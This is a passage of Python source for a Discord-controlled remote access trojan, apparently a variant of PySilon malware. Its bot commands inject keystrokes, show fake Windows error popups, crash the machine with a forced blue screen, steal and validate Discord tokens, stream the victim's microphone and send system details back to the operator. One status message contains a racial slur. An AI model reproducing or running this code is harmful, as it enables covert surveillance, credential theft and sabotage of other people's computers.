    keyboard.press_and_release("enter")
    await ctx.send(f"📝 **Typed:** `{text}` on their PC!")


@bot.command(name="fakeerror")
async def fake_error(ctx, user):
    if user == name:
        ctypes.windll.user32.MessageBoxW(0, "A critical error has occurred!", "Windows Error", 0x10 | 0x1)
        await ctx.send("🔥 **Displayed a fake Windows error!**")


@bot.command(name="sys32delpopup")
async def fake_delete_popup(ctx, user):
    if user == name:
        ctypes.windll.user32.MessageBoxW(0, "System32 has been deleted!", "Critical Error", 0x10 | 0x1)
        await ctx.send("🚨 **Displayed a fake System32 deletion popup!**")


@bot.command(name="listtabs")
async def list_browser_tabs(ctx, user):
    if user == name:
        browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]
        open_tabs = []

        for proc in psutil.process_iter(attrs=["pid", "name"]):
            if proc.info["name"].lower() in browsers:
                for window in gw.getWindowsWithTitle(""):
                    if window.title and proc.info["pid"] == window._hWnd:
                        open_tabs.append(window.title)

        if open_tabs:
            await ctx.send("🌐 **Open browser tabs:**\n" + "\n".join(open_tabs))
        else:
         await ctx.send("🚫 **No browser tabs found!**")


@bot.command(name="bsod")
async def bsod(ctx, user):
    if user == name:
        try:
            await ctx.send("Triggering BSOD...")
            nullptr = ctypes.POINTER(ctypes.c_int)()
            ctypes.windll.ntdll.RtlAdjustPrivilege(
                ctypes.c_uint(19), 
                ctypes.c_uint(1), 
                ctypes.c_uint(0), 
                ctypes.byref(ctypes.c_int())
            )
            ctypes.windll.ntdll.NtRaiseHardError(
            ctypes.c_ulong(0xC000007B), 
            ctypes.c_ulong(0), 
            nullptr, 
            nullptr, 
            ctypes.c_uint(6),
            ctypes.byref(ctypes.c_uint())
            )
        except Exception as e:
            print(e)



@bot.command(name="grabdiscord")
async def grabtokenz(ctx, user):
    if user == name:
        try:
            await ctx.send("Grabbing nigga's discord token...")
            grabToken()
        finally:
            await ctx.send("Done. Check the tokens channel.")    





bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, './crack.dll'))
discord.opus.load_opus(opuslib_path)


class PyAudioPCM(discord.AudioSource):
    def __init__(self, input_device=1, channels=2, rate=48000, chunk=960) -> None:
        self.p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = self.p.open(
            format=pyaudio.paInt16,
            channels=channels,
            rate=rate,
            input=True,
            input_device_index=input_device,
            frames_per_buffer=chunk
        )
    
    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)
    
    def cleanup(self):
        self.input_stream.stop_stream()
        self.input_stream.close()
        self.p.terminate()


@bot.command()
async def list_devices(ctx):
    p = pyaudio.PyAudio()
    device_list = []
    for i in range(p.get_device_count()):
        device_info = p.get_device_info_by_index(i)
        device_list.append(f"{i}: {device_info['name']}")
    p.terminate()
    await ctx.send("Available input devices:\n" + "\n".join(device_list))


@bot.command()
async def mic(ctx, user, device_index: int):
    if user == name:
        try:
            if ctx.author.voice is None or ctx.author.voice.channel is None:
                await ctx.send("You must be in a voice channel to use this command.")
                return
        
            channel = ctx.author.voice.channel
            vc = await channel.connect(self_deaf=True)
            vc.play(PyAudioPCM(input_device=device_index))
            await ctx.send(f"Joined voice channel and streaming microphone from device {device_index}.")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")


@bot.command(name="devices")
async def list_devices(ctx, user: str):
    """Lists all enabled input devices."""
    if user == name:
        p = pyaudio.PyAudio()
        devices = [f"**[{i}] {p.get_device_info_by_index(i)['name']}**"
                   for i in range(p.get_device_count())
                   if p.get_device_info_by_index(i)["maxInputChannels"] > 0]

        message = "**Available Input Devices:**\n" + "\n".join(devices)
        await ctx.send(message[:2000])





def get_value_by_label(label, output):
    label = label + ":"
    lines = output.splitlines()
    for line in lines:
        if line.startswith(label):
            return line.split(label)[1].strip()
    return None

def get_os_version(output):
    return get_value_by_label("OS Version", output)

def get_os_manufacturer(output):
    return get_value_by_label("OS Manufacturer", output)

def get_os_configuration(output):
    return get_value_by_label("OS Configuration", output)

def get_os_build_type(output):
    return get_value_by_label("OS Build Type", output)

def get_registered_owner(output):
    return get_value_by_label("Registered Owner", output)

def get_registered_organization(output):
    return get_value_by_label("Registered Organization", output)

def get_product_id(output):
    return get_value_by_label("Product ID", output)

def get_original_install_date(output):
    return get_value_by_label("Original Install Date", output)

def get_system_boot_time(output):
    return get_value_by_label("System Boot Time", output)

def get_system_manufacturer(output):
    return get_value_by_label("System Manufacturer", output)

def get_system_model(output):
    return get_value_by_label("System Model", output)

def get_system_type(output):
    return get_value_by_label("System Type", output)

def get_processors(output):
    return get_value_by_label("Processor(s)", output)

def get_bios_version(output):
    return get_value_by_label("BIOS Version", output)

def get_windows_directory(output):
    return get_value_by_label("Windows Directory", output)

def get_system_directory(output):
    return get_value_by_label("System Directory", output)

def get_boot_device(output):
    return get_value_by_label("Boot Device", output)

def get_system_locale(output):
    return get_value_by_label("System Locale", output)

def get_input_locale(output):
    return get_value_by_label("Input Locale", output)

def get_time_zone(output):
    return get_value_by_label("Time Zone", output)

def get_available_physical_memory(output):
    return get_value_by_label("Available Physical Memory", output)

def get_virtual_memory_max_size(output):
    return get_value_by_label("Virtual Memory: Max Size", output)

def get_virtual_memory_available(output):
    return get_value_by_label("Virtual Memory: Available", output)

def get_virtual_memory_in_use(output):
    return get_value_by_label("Virtual Memory: In Use", output)

def get_page_file_locations(output):
    return get_value_by_label("Page File Location(s)", output)

def get_domain(output):
    return get_value_by_label("Domain", output)

def get_logon_server(output):
    return get_value_by_label("Logon Server", output)

def get_hotfixes(output):
    return get_value_by_label("Hotfix(s)", output)

def get_network_cards(output):
    return get_value_by_label("Network Card(s)", output)

def get_hyperv_requirements(output):
    return get_value_by_label("Hyper-V Requirements", output)

def get_battery_percentage(output):
    return get_value_by_label("Battery Percentage", output)



@bot.command()
async def sys_info(ctx, user):
    if user == name:
        try:
            os_info = subprocess.run(
                'powershell.exe systeminfo', 
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            ).stdout
        except FileNotFoundError:
            await ctx.send("The 'systeminfo' command is not available on this system.")
            return

        os_version = get_os_version(os_info)
        os_manufacturer = get_os_manufacturer(os_info)
        os_configuration = get_os_configuration(os_info)
        os_build_type = get_os_build_type(os_info)
        registered_owner = get_registered_owner(os_info)
        registered_organization = get_registered_organization(os_info)
        product_id = get_product_id(os_info)
        original_install_date = get_original_install_date(os_info)
        system_boot_time = get_system_boot_time(os_info)
        system_manufacturer = get_system_manufacturer(os_info)
        system_model = get_system_model(os_info)
        system_type = get_system_type(os_info)
        processors = get_processors(os_info)
        bios_version = get_bios_version(os_info)
        windows_directory = get_windows_directory(os_info)
        system_directory = get_system_directory(os_info)
        boot_device = get_boot_device(os_info)
        system_locale = get_system_locale(os_info)
        input_locale = get_input_locale(os_info)
        time_zone = get_time_zone(os_info)
        available_physical_memory = get_available_physical_memory(os_info)
        virtual_memory_max_size = get_virtual_memory_max_size(os_info)
        virtual_memory_available = get_virtual_memory_available(os_info)
        virtual_memory_in_use = get_virtual_memory_in_use(os_info)
        page_file_locations = get_page_file_locations(os_info)
        domain = get_domain(os_info)
        logon_server = get_logon_server(os_info)
        hotfixes = get_hotfixes(os_info)
        network_cards = get_network_cards(os_info)
        hyperv_requirements = get_hyperv_requirements(os_info)
        battery_percentage = get_battery_percentage(os_info)

        info_message = f"OS Version: {os_version}\n" \
                       f"OS Manufacturer: {os_manufacturer}\n" \
                       f"OS Configuration: {os_configuration}\n" \
                       f"OS Build Type: {os_build_type}\n" \
                       f"Registered Owner: {registered_owner}\n" \
                       f"Registered Organization: {registered_organization}\n" \
                       f"Product ID: {product_id}\n" \
                       f"Original Install Date: {original_install_date}\n" \
                       f"System Boot Time: {system_boot_time}\n" \
                       f"System Manufacturer: {system_manufacturer}\n" \
                       f"System Model: {system_model}\n" \
                       f"System Type: {system_type}\n" \
                       f"Processors: {processors}\n" \
                       f"BIOS Version: {bios_version}\n" \
                       f"Windows Directory: {windows_directory}\n" \
                       f"System Directory: {system_directory}\n" \
                       f"Boot Device: {boot_device}\n" \
                       f"System Locale: {system_locale}\n" \
                       f"Input Locale: {input_locale}\n" \
                       f"Time Zone: {time_zone}\n" \
                       f"Available Physical Memory: {available_physical_memory}\n" \
                       f"Virtual Memory: Max Size: {virtual_memory_max_size}\n" \
                       f"Virtual Memory: Available: {virtual_memory_available}\n" \
                       f"Virtual Memory: In Use: {virtual_memory_in_use}\n" \
                       f"Page File Location(s): {page_file_locations}\n" \
                       f"Domain: {domain}\n" \
                       f"Logon Server: {logon_server}\n" \
                       f"Hotfix(s): {hotfixes}\n" \
                       f"Network Card(s): {network_cards}\n" \
                       f"Hyper-V Requirements: {hyperv_requirements}\n" \
                       f"Battery Percentage: {battery_percentage}\n"

        messages = []
        while len(info_message) > 0:
            messages.append(info_message[:2000])
            info_message = info_message[2000:]

        for message in messages:
            code_block_message = f"```{message}```"
            await ctx.send(code_block_message)


@bot.command(name="key")
async def key_command(ctx, *, keystrokes: str = None):
    if keystrokes is None:
        embed = discord.Embed(
            title="📛 Error",
            description="Syntax: !key <keys-to-press>",
            colour=discord.Colour.red()
        )
        embed.set_author(
            name="The Aladeen Citadel",
            icon_url="https://raw.githubusercontent.com/adolfhustler/Aladeen/Flag_of_Wadiya.gif"
        )
        reaction_msg = await ctx.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        if "ALTTAB" in keystrokes:
            pyautogui.hotkey('alt', 'tab')
        elif "ALTF4" in keystrokes:
            pyautogui.hotkey('alt', 'f4')
        else:
            for key in keystrokes:
                pyautogui.press(key)
        
        embed = discord.Embed(
            title="🟢 Success",
            description="All keys have been successfully pressed",
            colour=discord.Colour.green()
        )
        embed.set_author(
            name="PySilon-malware",
            icon_url="https://raw.githubusercontent.com/adolfhustler/Aladeen/Flag_of_Wadiya.gif"
        )
        reaction_msg = await ctx.send(embed=embed)
        await reaction_msg.add_reaction('🔴')            


@bot.command(name="checktoken")
async def checktoken(ctx, token: str):
    result = check_discord_token(token)

    if not result["valid"]:
        await ctx.send("❌ Invalid or expired token.")
        return

    embed = discord.Embed(
        title=f"Token Info: {result['username']}",
        color=discord.Color.green()
    )
    embed.add_field(name="User ID", value=result["user_id"], inline=False)
    embed.add_field(name="Email", value=result["email"], inline=False)
    embed.add_field(name="Phone", value=result["phone"], inline=False)
    embed.add_field(name="MFA Enabled", value=str(result["mfa_enabled"]), inline=False)
    embed.add_field(name="Locale", value=result["locale"], inline=False)
    embed.add_field(name="Verified", value=str(result["verified"]), inline=False)
    embed.add_field(name="Badges", value=", ".join(result["badges"]) if result["badges"] else "None", inline=False)
    embed.add_field(name="Nitro", value="Yes" if result["has_nitro"] else "No", inline=False)
    embed.add_field(name="Available Boosts", value=str(result["available_boosts"]), inline=False)
    
    if result["avatar_url"]:
        embed.set_thumbnail(url=result["avatar_url"])

    await ctx.send(embed=embed)



def run_rat():
    bot.run(DISCORD_BOT_TOKEN)                    
